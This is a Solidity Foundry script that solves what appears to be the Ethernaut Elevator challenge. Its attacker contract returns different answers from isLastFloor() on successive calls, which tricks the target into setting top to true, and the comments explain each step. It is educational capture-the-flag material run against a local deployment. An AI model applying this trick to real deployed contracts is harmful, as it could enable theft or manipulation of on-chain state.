// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Elevator} from "../src/Elevator.sol";

contract ElevatorSolution is Script {
    // $ forge script script/Elevator.s.sol --tc ElevatorSolution

    function run() external {
        Elevator elevatorInstance = new Elevator();

        // --- Attack Starts from Here ---
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);
        ElevatorAttack attackContract = new ElevatorAttack(address(elevatorInstance));

        // - The Elevator contract is responsible for changing the floor if it is not the last floor.
        // - The `Elevator` checks first for the given floor number. Then, if the floor is not the last it sets the floor and the top.
        // - If we made the function `isLastFloor(floor)` return a different value from the first one it called, we will cause the Elevator logic to break.
        // - We will make our building return that the floor is not the top in the first call, and return that the same floor is the top in the second call.
        // - So we will pass the check that is in `Elevator::goTo()`, and set the Top floor with the floor we provided.
        // - We updated the floor value, and set the top to true. This means we reached the top of the building and passed the challenge.

        console.log("Top:", elevatorInstance.top());
        console.log("Floor:", elevatorInstance.floor());
        attackContract.attack();
        console.log("Top:", elevatorInstance.top());
        console.log("Floor:", elevatorInstance.floor());

        vm.stopPrank();
    }
}

contract ElevatorAttack {
    Elevator elevatorInstance;
    uint256 numberOfCalls;

    constructor(address target) {
        elevatorInstance = Elevator(target);
    }

    function attack() public {
        elevatorInstance.goTo(0 /* floor */ );
    }

    function isLastFloor(uint256 /* floor */ ) public returns (bool) {
        numberOfCalls++;
        if (numberOfCalls > 1) {
            return true;
        }
        return false;
    }
}
